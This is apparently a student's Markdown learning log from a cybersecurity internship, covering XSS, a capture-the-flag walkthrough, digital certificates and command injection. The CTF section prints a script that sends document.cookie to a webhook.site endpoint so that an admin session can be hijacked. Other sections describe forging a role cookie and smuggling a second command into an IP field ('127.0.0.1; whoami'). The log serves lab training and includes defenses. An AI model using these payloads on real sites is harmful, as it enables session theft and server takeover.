
# 🧠 Day 4: XSS, Webhook Exploitation, Digital Certificates, and Command Injection

---

## 🚨 Cross-Site Scripting (XSS)

**Cross-Site Scripting (XSS)** is a vulnerability that allows attackers to inject **malicious JavaScript code** into webpages viewed by other users. It is a **high to critical** severity vulnerability.

### 🎯 What can XSS do?
- Steal cookies and sessions
- Perform actions on behalf of users
- Redirect users
- Log keystrokes

### ⚔️ Types of XSS

| Type        | Description                                                                 | Example |
|-------------|-----------------------------------------------------------------------------|---------|
| **Stored**  | Malicious script is permanently stored on the server (e.g., in database).   | A comment box storing `<script>alert(1)</script>` |
| **Reflected** | Script is reflected off a web server (e.g., via URL parameters).            | `http://site.com?q=<script>alert(1)</script>` |
| **DOM-Based** | Occurs when the client-side script manipulates the DOM without validation. | JS reads from `location.hash` and injects it into the page |

### 🧪 Requirements to Exploit XSS:
1. A **user input field**
2. That input should be **rendered on the frontend** (or backend if stored)

### 🧬 Basic XSS Test Payload
```html
<script>alert(1)</script>
```

If an alert box pops up, the input is being executed as JavaScript = vulnerable!

---

## 🔍 XSS CTF Challenge with Webhook.site

We were given a vulnerable "ticket submission" web app. The goal: exploit XSS to access **admin cookies** and find the flag.

### 🔧 Steps:
1. Identify the **message box** as the vulnerable field.
2. Use [Webhook.site](https://webhook.site) to generate a **unique endpoint**.
3. Craft XSS payload:
```html
<script>
fetch("https://webhook.site/your-custom-id?cookie=" + document.cookie)
</script>
```
![xss](https://github.com/ayanrfn/cybersecurity-internship-2025/blob/main/day2img/XSS.jpg)
![webhook](https://github.com/ayanrfn/cybersecurity-internship-2025/blob/main/day2img/webhook.jpg)

4. Submit the payload in the message box.
5. Once the bot/admin user views it, the **cookies get sent** to your webhook endpoint.
6. Look for the request containing `admin_session` — this contains session cookie.
7. Go to `Application > Cookies` in browser dev tools.
8. Paste the stolen cookie name and value.
9. Replace `admin_login` in the URL with `/admin` to gain access.
10. Inspect the page to find the flag.

![ctf2](https://github.com/ayanrfn/cybersecurity-internship-2025/blob/main/day2img/ctf.jpg)

---

## 🛡️ XSS Defense Mechanisms

1. **HttpOnly Cookies** – Makes cookies inaccessible to JS via `document.cookie`.
2. **Whitelist-Based Input Validation** – Only allow safe characters (e.g., letters, numbers).
3. **JWT Tokens** – Helps authenticate without exposing sensitive session cookies.

---

## 🎭 Alternate Solution (Cookie Role Manipulation)
- Decode the cookie using Base64.
- Change the `role` value to `admin`.
- Re-encode and paste it back.
- Refresh and access admin section.

---

## 🔐 Digital Certificates

**Digital Certificates** use **Public Key Infrastructure (PKI)** to secure communication:
- **Public Key**: Shared with anyone, encrypts data.
- **Private Key**: Kept on the server, decrypts data.

### 🔑 Use Cases:
- Secure HTTPS connections
- Encrypt sensitive data
- Digital signatures to verify authenticity

### 📁 How it works:
1. Server provides its **digital certificate** to client.
2. Client uses the **public key** to send encrypted data.
3. Only the **private key** (server-side) can decrypt it.

---

## 🧨 Command Injection (CMDi)

**Command Injection** occurs when user input is executed as a **shell command** by the server.

### ⚙️ Real-world example:
Web app with a host checker tool lets user input IP. Vulnerable backend runs:
```bash
ping <user_input>
```

### 🧪 Exploiting CMDi
1. Enter a valid IP: `127.0.0.1`
2. Enable **Burp Intercept**, click **Check**
3. Modify the request:
```
127.0.0.1; whoami
```
4. Forward the request
5. Response shows `www-data` or another system user

> `whoami` is a Linux command that prints the current user — proof of command execution.

![Cmdi](https://github.com/ayanrfn/cybersecurity-internship-2025/blob/main/day2img/cmdi.jpg)

---

## ✅ Day 4 Summary

- Learned about **XSS**, payloads, and cookie theft
- Completed a full CTF using **webhook.site**
- Learned about **digital certificates** and secure communication
- Practiced **Command Injection** using Burp Suite
- Understood how session tokens and cookies are used and manipulated

---

